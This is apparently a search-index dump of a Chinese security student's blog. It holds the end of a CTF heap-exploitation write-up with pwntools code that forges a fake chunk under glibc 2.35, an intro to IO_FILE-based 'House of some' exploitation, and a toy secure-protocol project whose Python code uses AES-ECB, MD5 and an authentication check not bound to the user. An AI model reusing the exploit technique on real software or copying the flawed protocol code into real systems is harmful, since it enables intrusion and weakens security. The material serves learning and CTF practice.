u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))&lt;&lt;12success(&quot;heap_addrr :&quot;+hex(heap_addr))delete(0)show(0)libc_addr = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x1f2ce0success(&quot;libc_addr :&quot;+hex(libc_addr))add(0x500,&quot;aaaa&quot;)#3add(0x10,&quot;aaaa&quot;)#4add(0x10,&quot;aaaa&quot;)#5add(0x500,&quot;aaaa&quot;)#6add(0x10,&quot;aaaa&quot;)#7delete(6)payload = p64(libc_addr + 0x1f2ce0)+p64(bss_addr)edit(6,len(payload),payload)any_write(p64(bss_addr+0x8),p64(0x30)+p64(heap_addr+0x7e0)+p64(libc_addr+0x1f2ce0))payload = p64(0x30)+p64(0x20)any_write(p64(bss_addr+0x30),payload)any_write(p64(libc_addr+0x1f2ce0+0x10),p64(bss_addr))gdb.attach(io,&#x27;b *malloc+10&#x27;)add(0x20,&quot;aaaa&quot;)#8pause() 可以成功的把伪造的fake chunk申请出来为了实现这一次非法内存申请 需要泄露heap地址以及libc地址修改unsortedbin chunk的bk域修改fake chunk的size域 fd域 bk域 以及其next chunk的prev_size和size域修改main_arena+96+0x10处为fake chunk由此可见glibc2.35对于unsortedbin的检查十分严格 我们需要对内存空间有极大的可控制性才能绕过check if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"House of some","slug":"house-of-some","date":"2024-11-19T05:59:23.000Z","updated":"2024-12-20T14:38:02.000Z","comments":true,"path":"2024/11/19/house-of-some/","link":"","permalink":"http://example.com/2024/11/19/house-of-some/","excerpt":"","text":"前言本文的目的不单单在于学习house of some这条链的利用手法 而是借此机会 了解清楚关于io file这块利用的原理house of some是在house of apple2的基础上进一步优化的链 所需的条件更加精简 而且已有大佬编写了自动化利用的库 在比赛抢血或者节省时间中有更大的优势原文地址:https://blog.csome.cc/p/house-of-some/ IO_Fileio结构体的定义位于&#x2F;libio&#x2F;bits&#x2F;types&#x2F;struct_FILE.h中https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/bits/types/struct_FILE.h#L49 struct _IO_FILE&#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ char *_IO_buf_base; /* Start of reserve area. */ char *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it&#x27;s too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 在同一进程中的io结构体 通过chain成员连接在一起 类似于单向链表初始会载入三个结构体 stdin stdout stderr 2024年12月20号记考虑到已经大三了 再加上不打算读研 所以接下来的重心应该会放在iot上的学习 关于ctf比赛是不会再打了 所以ctf内容暂停更新咯 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"安全协议设计过程","slug":"安全协议设计过程","date":"2024-10-11T09:58:59.000Z","updated":"2024-11-22T13:18:00.000Z","comments":true,"path":"2024/10/11/安全协议设计过程/","link":"","permalink":"http://example.com/2024/10/11/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B/","excerpt":"","text":"设计思路安全协议的目的就是传输数据 并且实现两个基础目标 安全性和可靠性 前者指数据不会被泄露 后者指数据不会被篡改所以数据的传输过程 可以归类于四个阶段“发” “传“ ”收“ ”验“发送阶段 需要对数据进行加密这里有两种思路 一种是使用对称加密 还有一种是选择非对称加密 从安全性上 个人更倾向使用后者传输阶段 这里打算使用socket来负责两个设备之间的通讯 同时还需要考虑进行身份验证 防止非法用户传输接受阶段 为了防止攻击者使用过量的数据来瘫痪通讯 也许需要加入过滤机制来接受数据 这一点考虑到实现的复杂 是否加入还有待考虑验证阶段 需要对接受到的数据进行检测 以防止数据被篡改或者是传输不完整 传输阶段的一些尝试对于socket的使用并不是非常熟练 打算先通过一些简单的交互来加深一下本机的ubuntu虚拟机同时充当客户端和服务端 使用python语言编写 v0.1服务端代码 import sockets = socket.socket() #创建套接字 默认使用TCP协议s.bind((&quot;127.0.0.1&quot;,6666))s.listen(5) #最多连接5个客户端print(&quot;等待连接中&quot;)while 1: sock,addr = s.accept() print(sock,addr) while 1: text = sock.recv(1024) #接受的最大字节数为1024 if len(text.strip()) == 0: print(&quot;服务端接收到客户端的数据为空&quot;) else: print(&quot;收到客户端发送的数据为：&#123;&#125;&quot;.format(text.decode())) content = input(&quot;请输入发送给客户端的信息：&quot;) sock.send(content.encode()) sock.close() 客户端代码 import sockets = socket.socket()s.connect((&quot;127.0.0.1&quot;,6666))print(&quot;成功连接&quot;)while 1: data = input(&quot;需要向服务端传输的数据 :&quot;) s.send(data.encode()) text = s.recv(1024).decode() print(&quot;服务端发送的数据为:&#123;&#125;&quot;,format(text)) 实现效果 身份验证的实现目前思考的是采用哪种身份验证方案一种是采用第三方验证 比如auth0 这种的虽然实现起来更加高级且安全第二种就是只需要做到安全的密钥交换 然后采用静态的用户密码库存储(也可以更换成sql) 然后加密传输用户名密码即可考虑到第一种方法工作量太大 而且实现起来复杂(其实就是不会得边学边写) 还是乖乖采用第二种方法吧这里采用dh算法 来实现在不安全的通讯中传输共享密钥 获得到共享密钥后 使用aes加密算法来加密用户名和密码暂时是通过静态的用户名和密码库来实现身份验证 同时这里还存在一个攻击漏洞 对于密码的检测是遍历密码库中的所有密码 有满足的即可 并没有检验是否对应该用户 v0.2服务端代码 import socketimport randomimport mathfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESusers = [&#x27;user1&#x27;,&#x27;user2&#x27;,&#x27;user3&#x27;]passwds = [&#x27;aaaa&#x27;,&#x27;bbbb&#x27;,&#x27;cccc&#x27;]def key_switch(s,public_key_server): print(&quot;开始进行公钥交换&quot;) sock,addr = s.accept() public_key_client = sock.recv(1024) public_key_bytes = public_key_server.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) sock.send(public_key_bytes) return serialization.load_pem_public_key(public_key_client),sock,addr def Authentication(sock,shared_key): key = shared_key[:16] # 确保密钥长度符合要求（256 位） aes = AES.new(key,AES.MODE_ECB) username = (sock.recv(1024)) decrypted_username = aes.decrypt(username) username = (unpad(decrypted_username, 16)).decode() if username in users: sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode()) print(&quot;用户名正确&quot;) password = (sock.recv(1024)) decrypted_password = aes.decrypt(password) password = (unpad(decrypted_password, 16)).decode() if password in passwds: sock.send(&quot;身份验证通过&quot;.encode()) print(&quot;密码正确&quot;) return else : sock.send(&quot;密码错误，终止连接&quot;.encode()) sock.close() exit() else: sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode()) sock.close() exit()def main(): # 固定的 DH 参数 p = 0xB7E4DE6A253A6E3A1F7F6E2A8F9FBA6E8C6F1A8F9C7D7F7AA6A3E1E9B7EAE4E8C6F7F6B7E4D6E8C6A3E2E9E8F9F7E5E8C2D1E8F8C6D2E5A1F5E2A5E8D8C5D8A5E5B7A5F5A8D7A5F1E5B4D5A1 g = 2 # 创建 DH 参数对象 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_server = parameters.generate_private_key() public_key_server = private_key_server.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议 s.bind((&quot;10.0.137.2&quot;,6666)) s.listen(5) #最多连接5个客户端 public_key_client,sock,addr = key_switch(s,public_key_server) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_server.exchange(public_key_client) print(&quot;等待连接中&quot;) while 1: print(sock,addr) print(&quot;开始进行身份验证&quot;) Authentication(sock,shared_key) while 1: text = sock.recv(1024) #接受的最大字节数为1024 if len(text.strip()) == 0: print(&quot;服务端接收到客户端的数据为空&quot;) else: print(f&quot;收到客户端发送的数据为：&#123;text.decode()&#125;&quot;) content = input(&quot;请输入发送给客户端的信息：&quot;) sock.send(content.encode()) sock.close() if __name__ == &quot;__main__&quot;: main() 客户端代码 import socketimport mathimport randomfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESdef key_switch(s,public_key_client): print(&quot;开始进行公钥交换&quot;) s.connect((&quot;69.165.67.133&quot;,6666)) public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) return serialization.load_pem_public_key(public_key_server)def Authentication(s,shared_key): print(&quot;进行身份验证&quot;) key = shared_key[:16] # 确保密钥长度符合要求（256 位） aes = AES.new(key,AES.MODE_ECB) username = input(&quot;输入用户名:&quot;) username_bytes = pad(username.encode(&#x27;utf-8&#x27;), AES.block_size) encrypt_username = aes.encrypt(username_bytes) s.send(encrypt_username) text = s.recv(1024).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: print(text) exit() else: password = input(&quot;输入密码:&quot;) password_bytes = pad(password.encode(&#x27;utf-8&#x27;),AES.block_size) encrypt_password = aes.encrypt(password_bytes) s.send(encrypt_password) text = s.recv(1024).decode() if text == &quot;密码错误，终止连接&quot;: print(text) exit() else : print(text) def main(): # 固定的 DH 参数 p = 0xB7E4DE6A253A6E3A1F7F6E2A8F9FBA6E8C6F1A8F9C7D7F7AA6A3E1E9B7EAE4E8C6F7F6B7E4D6E8C6A3E2E9E8F9F7E5E8C2D1E8F8C6D2E5A1F5E2A5E8D8C5D8A5E5B7A5F5A8D7A5F1E5B4D5A1 g = 2 # 创建 DH 参数对象 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) public_key_server = key_switch(s,public_key_client) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_client.exchange(public_key_server) Authentication(s,shared_key) print(&quot;成功连接&quot;) while 1: data = input(&quot;需要向服务端传输的数据 :&quot;) s.send(data.encode()) text = s.recv(1024).decode() print(f&quot;服务端发送的数据为:&#123;text&#125;&quot;)if __name__ == &quot;__main__&quot;: main() 针对账号密码的问题 进行了一波优化使用sqlite3模块和sql数据库配合使用 实现账号密码的校验暂时只打算把注册账号的权限给admin用户 在权限校验这块还存在问题 使用的是username的检测 严谨一点的应该加入数据库的参数 这样方便后面更改用户的操作权限这一版大致优化了一些交互 不过还是很简陋 预计后面要增加窗口化界面同时目前最关键的问题是 dh算法的g参数 我还没去跑出来一个较大的数 还是使用的2 v0.3服务端 import socketimport randomimport mathfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESimport sqlite3users = [&#x27;user1&#x27;,&#x27;user2&#x27;,&#x27;user3&#x27;]passwds = [&#x27;aaaa&#x27;,&#x27;bbbb&#x27;,&#x27;cccc&#x27;]conn = sqlite3.connect(&#x27;users.db&#x27;)cursor = conn.cursor()def key_switch(s,public_key_server): print(&quot;开始进行公钥交换&quot;) sock,addr = s.accept() public_key_client = sock.recv(1024) public_key_bytes = public_key_server.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) sock.send(public_key_bytes) return serialization.load_pem_public_key(public_key_client),sock,addrdef decrypt_data(shared_key,data): key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) decrypted_data = aes.decrypt(data) data = (unpad(decrypted_data, 16)).decode() return data def Authentication(sock,shared_key,cursor): key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) username = (sock.recv(1024)) username = decrypt_data(shared_key,username) cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,)) result = cursor.fetchone() if result != None: sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode()) print(&quot;用户名正确&quot;) password = (sock.recv(1024)) decrypted_password = aes.decrypt(password) password = (unpad(decrypted_password, 16)).decode() cursor.execute(&quot;SELECT password FROM users WHERE password = ?&quot;, (password,)) result = cursor.fetchone() if result != None: sock.send(&quot;身份验证通过&quot;.encode()) print(&quot;密码正确&quot;) if username == &quot;admin&quot;: permission_value = 1 else : permission_value = 0 return permission_value else : sock.send(&quot;密码错误，终止连接&quot;.encode()) sock.close() exit() else: sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode()) sock.close() exit()def menu(sock): text = &quot;&quot;&quot; 菜单选项: 1. 传输文本数据 2. 传输附件 3. 注册新用户 &quot;&quot;&quot; sock.send(text.encode())def transfer_txt(): #还没写 returndef transfer_file(): #还没写 returndef register(permission_value,sock,shared_key,cursor): if permission_value == 0: sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode()) return else : sock.send(&quot;输入注册用户名&quot;.encode()) username = (sock.recv(1024)) username = decrypt_data(shared_key,username) sock.send(&quot;输入密码&quot;.encode()) password = sock.recv(1024) password = decrypt_data(shared_key,password) try: # 插入新的用户数据 cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password)) conn.commit() sock.send(&quot;用户注册成功&quot;.encode()) except sqlite3.IntegrityError: sock.send(&quot;用户已存在&quot;.encode()) except Exception as e: sock.send(e.encode())def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 # 创建 DH 参数对象 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_server = parameters.generate_private_key() public_key_server = private_key_server.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议 s.bind((&quot;10.0.137.2&quot;,6666)) s.listen(5) #最多连接5个客户端 public_key_client,sock,addr = key_switch(s,public_key_server) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_server.exchange(public_key_client) print(&quot;等待连接中&quot;) while 1: print(sock,addr) print(&quot;开始进行身份验证&quot;) permission_value = Authentication(sock,shared_key,cursor) while 1: menu(sock) choice = (sock.recv(1024)).decode() if choice == &quot;1&quot;: transfer_txt() elif choice == &quot;2&quot;: transfer_file() elif choice == &quot;3&quot;: register(permission_value,sock,shared_key,cursor) else: sock.send(&quot;输入的选项错误 请重新输入&quot;.encode()) sock.close() if __name__ == &quot;__main__&quot;: main() 客户端 import socketimport mathimport randomfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESdef key_switch(s,public_key_client): print(&quot;开始进行公钥交换&quot;) s.connect((&quot;69.165.67.133&quot;,6666)) public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) return serialization.load_pem_public_key(public_key_server)def encrypt_data(shared_key,data): key = shared_key[:16] # 确保密钥长度符合要求（256 位） aes = AES.new(key,AES.MODE_ECB) data_bytes = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size) encrypt_data = aes.encrypt(data_bytes) return encrypt_datadef Authentication(s,shared_key): print(&quot;进行身份验证&quot;) key = shared_key[:16] # 确保密钥长度符合要求（256 位） aes = AES.new(key,AES.MODE_ECB) username = input(&quot;输入用户名:&quot;) encrypt_username = encrypt_data(shared_key,username) s.send(encrypt_username) text = s.recv(1024).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: print(text) exit() else: print(text) password = input(&quot;输入密码:&quot;) encrypt_password = encrypt_data(shared_key,password) s.send(encrypt_password) text = s.recv(1024).decode() if text == &quot;密码错误，终止连接&quot;: print(text) exit() else : print(text) def register(s,shared_key): print((s.recv(1024)).decode()) username = input(&quot;输入用户名&quot;) encrypt_username = encrypt_data(shared_key,username) s.send(encrypt_username) password = input(&quot;输入密码&quot;) encrypt_password = encrypt_data(shared_key,password) s.send(encrypt_password) print((s.recv(1024)).decode()) def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 # 创建 DH 参数对象 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) public_key_server = key_switch(s,public_key_client) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_client.exchange(public_key_server) Authentication(s,shared_key) print(&quot;成功连接&quot;) while 1: print((s.recv(1024)).decode()) choice = input(&quot;输入选项:&quot;) s.send(choice.encode()) if choice == &quot;3&quot;: register(s,shared_key)if __name__ == &quot;__main__&quot;: main() 传输阶段的数据加密这一章节的目的是设计出来一个数据包格式常规的应该是由这几个部分组成 包头+密文长度+密文+校验和这就要设计到两个算法 消息加密算法以及消息摘要算法加密还是老样子 使用dh算法得到的共享密钥来进行aes加密摘要算法的目的是为了保证消息的完整性这里就使用md5算法目前打算将数据包格式定义成下图所示消息类型负责优化原本的服务端和客户端 原本的服务端针对传输数据类型不同以及新增用户的功能 是采用了菜单形式 过于简单且多了许多额外的交互 这里选择将choice变量融合到数据中一起传输然后还得完善上一章节预留的 传输文件 这里打算暂时只包括传输图像 音频 文本文件 更多的格式和文件类型由于没有经过测试 不知道能不能完整的传输过去对于服务端来说 接受到文件后 还需要判断属于哪种类型的文件 方便保存想到的是两种方案 一种是客户端发送文件的时候额外发送文件的类型 服务端接受后按照类型保存文件第二种是 在服务端接受数据后利用magic库来判断文件类型但是这两种方法 似乎都很容易被绕过 要是客户端将马伪造成正常格式的文件传过来就不好玩了虽然但是 本次只是打算设计一个能用的安全协议 所以安全性这里就只是预警一下 不去研究如何改进了 这里采用第二种方法在编写传输图像文件的时候 遇到了一个新的问题按照上面的数据包 单个数据包最多传输0xffffbytes 但是一个图像不止这些字节 所以就需要分段传输 那么我们就需要在数据包格式中的消息类型 加入是否属于切片传输的位置 来供服务端判断迭代了数据包格式 前面的判断位之所以给了4byte 考虑到服务端处理切片数据的时候 需要确定当前是否属于最后一个切片(常规的协议一般在数据包中增加当前切片对于整段数据的偏移 这里我打算做简单一点) 所以前2个byte用来存储一共有多少个切片 后两个byte用来存储当前是第几个切片而检测是否属于切片数据包也很容易 只要这4个byte不为\\x00即可同时 这个版本还优化了之前代码中的一些逻辑漏洞 容易造成服务端的server运行中断 v0.4服务端 import socketimport hashlibimport magicfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESimport sqlite3import base64users = [&#x27;user1&#x27;,&#x27;user2&#x27;,&#x27;user3&#x27;]passwds = [&#x27;aaaa&#x27;,&#x27;bbbb&#x27;,&#x27;cccc&#x27;]mime = magic.Magic(mime=True)conn = sqlite3.connect(&#x27;users.db&#x27;)cursor = conn.cursor()def md5_encrypt(data): # 创建 MD5 哈希对象 md5_hash = hashlib.md5() # 更新哈希对象 md5_hash.update(data) # 获取十六进制的哈希值 hash_result = md5_hash.hexdigest() return hash_resultdef key_switch(s,public_key_server): print(&quot;开始进行公钥交换&quot;) sock,addr = s.accept() public_key_client = sock.recv(1024) public_key_bytes = public_key_server.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) sock.send(public_key_bytes) return serialization.load_pem_public_key(public_key_client),sock,addrdef decrypt_data(shared_key,data): #data要为byte型 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) decrypted_data = aes.decrypt(data) data = (unpad(decrypted_data, 16)).decode() return datadef unpack_data(sock,shared_key,orign_data): sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;) sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;) data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;) data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;) data_md5 = (orign_data[-32:]).decode() base_data = decrypt_data(shared_key,orign_data[12:(data_length-32)]) data = base64.b64decode(base_data.encode()) value = verify_md5(data,data_md5,sock) if value == 0: sock.send(f&quot;第&#123;sliced_num+1&#125;组数据校验失败&quot;.encode()) else : sock.send(f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;.encode()) return sliced_sum,sliced_num,data_type,data,value def Authentication(sock,shared_key,cursor): key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) username = (sock.recv(1024)) username = decrypt_data(shared_key,username) cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,)) result = cursor.fetchone() if result != None: sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode()) print(&quot;用户名正确&quot;) password = (sock.recv(1024)) decrypted_password = aes.decrypt(password) password = (unpad(decrypted_password, 16)).decode() cursor.execute(&quot;SELECT password FROM users WHERE password = ?&quot;, (password,)) result = cursor.fetchone() if result != None: sock.send(&quot;身份验证通过&quot;.encode()) print(&quot;密码正确&quot;) if username == &quot;admin&quot;: permission_value = 1 else : permission_value = 0 return permission_value else : sock.send(&quot;密码错误，终止连接&quot;.encode()) sock.close() return 3 else: sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode()) sock.close() return 3def menu(sock): text = &quot;开始进行数据传输 请按照规定格式发送数据&quot; sock.send(text.encode())def transfer_txt(addr,data): print(f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)def transfer_file(sock,data): data_type = mime.from_buffer(data) if data_type == &quot;text/plain&quot;: with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f: f.write(data.encode()) sock.send(&quot;成功接受到文件\\n&quot;.encode())def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key): data_bytes = data while sliced_num != sliced_sum-1: orign_data = (sock.recv(2048)) sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data) data_bytes += data data_type = mime.from_buffer(data_bytes) if data_type == &quot;image/png&quot;: with open(&quot;output.png&quot;, &#x27;wb&#x27;) as f: f.write(data_bytes) sock.send(&quot;成功接受到文件\\n&quot;.encode()) # if data_type == &quot;text/plain&quot;: # with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f: # f.write(data_bytes) # sock.send(&quot;成功接受到文件&quot;.encode())def register(permission_value,sock,shared_key,cursor,data): if permission_value == 0: sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode()) return else : parts = data.split(b&#x27;;&#x27;) username = parts[0] password = parts[1] try: # 插入新的用户数据 cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password)) conn.commit() sock.send(&quot;用户注册成功&quot;.encode()) except sqlite3.IntegrityError: sock.send(&quot;用户已存在&quot;.encode()) except Exception as e: sock.send(e.encode())def verify_md5(data, original_md5,sock): current_md5 = md5_encrypt(data) return current_md5 == original_md5def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 # 创建 DH 参数对象 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_server = parameters.generate_private_key() public_key_server = private_key_server.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议 s.bind((&quot;10.0.137.2&quot;,6666)) s.listen(5) #最多连接5个客户端 while 1: public_key_client,sock,addr = key_switch(s,public_key_server) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_server.exchange(public_key_client) print(&quot;等待连接中&quot;) print(sock,addr) print(&quot;开始进行身份验证&quot;) permission_value = Authentication(sock,shared_key,cursor) if permission_value == 3: continue while 1: menu(sock) orign_data = (sock.recv(2048)) if len(orign_data) == 0: break sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data) if data_type == 1: transfer_txt(addr,data) elif data_type == 2: if sliced_sum != 0 or sliced_num != 0: transfer_file2(sock,data,sliced_sum,sliced_num,shared_key) else: transfer_file(sock,data) elif data_type ==3: register(permission_value,sock,shared_key,cursor,data) sock.close() if __name__ == &quot;__main__&quot;: main() 客户端 import socketimport structimport hashlibimport base64from cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESchoice_text = &quot;&quot;&quot;1.传输文本数据2.传输文件数据3.新增用户&quot;&quot;&quot;def md5_encrypt(data): # 创建 MD5 哈希对象 md5_hash = hashlib.md5() # 更新哈希对象 md5_hash.update(data) # 获取十六进制的哈希值 hash_result = md5_hash.hexdigest() return hash_resultdef pack_data(choice,base_data,shared_key,sliced,sum,data): sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum) sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced) choice_type = struct.pack(&#x27;&gt;I&#x27;,choice) en_data = encrypt_data(shared_key,base_data.decode()) hash_data = md5_encrypt(data).encode() temp = choice_type+en_data+hash_data transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp return transfer_datadef key_switch(s,public_key_client): print(&quot;开始进行公钥交换&quot;) s.connect((&quot;69.165.67.133&quot;,6666)) public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) return serialization.load_pem_public_key(public_key_server)def encrypt_data(shared_key,data): key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) data_bytes = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size) encrypt_data = aes.encrypt(data_bytes) return encrypt_datadef Authentication(s,shared_key): print(&quot;进行身份验证&quot;) key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) username = input(&quot;输入用户名:&quot;) encrypt_username = encrypt_data(shared_key,username) s.send(encrypt_username) text = s.recv(1024).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: print(text) exit() else: print(text) password = input(&quot;输入密码:&quot;) encrypt_password = encrypt_data(shared_key,password) s.send(encrypt_password) text = s.recv(1024).decode() if text == &quot;密码错误，终止连接&quot;: print(text) exit() else : print(text) def register(s,shared_key): username = input(&quot;输入用户名 :&quot;) password = input(&quot;输入密码 :&quot;) data = username+&quot;;&quot;+password base_data = base64.b64encode(data.encode()) transfer_data = pack_data(3,base_data,shared_key,0,0,data.encode()) s.send(transfer_data)def transfer_txt(s,shared_key): text = input(&quot;输入数据 :&quot;) if len(text) &gt; 1000: sliced = 0 base64_text = base64.b64encode(text.encode()) chunk_size = 1000 sliced_data = slice_string(base64_text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum,sliced_data[i]) sliced += 1 s.send(transfer_data) else : sliced = 0 sliced_sum = 0 base_text = base64.b64encode(text.encode()) transfer_data = pack_data(1,base_text,shared_key,sliced,sliced_sum,text.encode()) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;)def slice_string(data, chunk_size): #根据指定大小切片字符串 return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]def transfer_file(s,shared_key): file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) with open(file_addr,&#x27;rb&#x27;) as file: text = file.read() if len(text) &gt; 1000: sliced = 0 chunk_size = 1000 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\\n&quot;) for i in range(len(sliced_data)): sliced_basedata = base64.b64encode(sliced_data[i]) transfer_data = pack_data(2,sliced_basedata,shared_key,sliced,sliced_sum,sliced_data[i]) sliced += 1 s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;) else : sliced = 0 sliced_sum = 0 base_text = base64.b64encode(text) transfer_data = pack_data(2,base_text,shared_key,sliced,sliced_sum,text) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;) def main(): # 固定的 DH 参数 